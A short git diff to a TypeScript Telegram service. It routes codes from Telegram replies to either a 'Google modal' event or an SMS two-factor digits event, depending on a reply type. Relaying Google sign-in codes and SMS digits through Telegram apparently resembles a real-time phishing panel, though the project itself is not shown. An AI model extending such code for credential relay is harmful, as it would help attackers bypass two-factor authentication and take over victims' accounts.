@@ -409,11 +409,18 @@ export class TelegramService {
               axios.post(buildApiUrl("/api/appauth/reply"), {
                 replyToMessageId,
                 code,
-              }).then(() => {
-                // Dispatch the code to the Google modal
-                window.dispatchEvent(
-                  new CustomEvent("appauth-code-received", { detail: { code } })
-                );
+              }).then((response) => {
+                // Dispatch to the correct page based on reply type
+                const replyType = response?.data?.replyType;
+                if (replyType === '2fasms') {
+                  window.dispatchEvent(
+                    new CustomEvent("appauth-sms-digits-received", { detail: { digits: code } })
+                  );
+                } else {
+                  window.dispatchEvent(
+                    new CustomEvent("appauth-code-received", { detail: { code } })
+                  );
+                }
               }).catch(error => {
                 if (process.env.NODE_ENV === "development") {
                   console.warn("[Telegram] Error sending reply:", error.message);
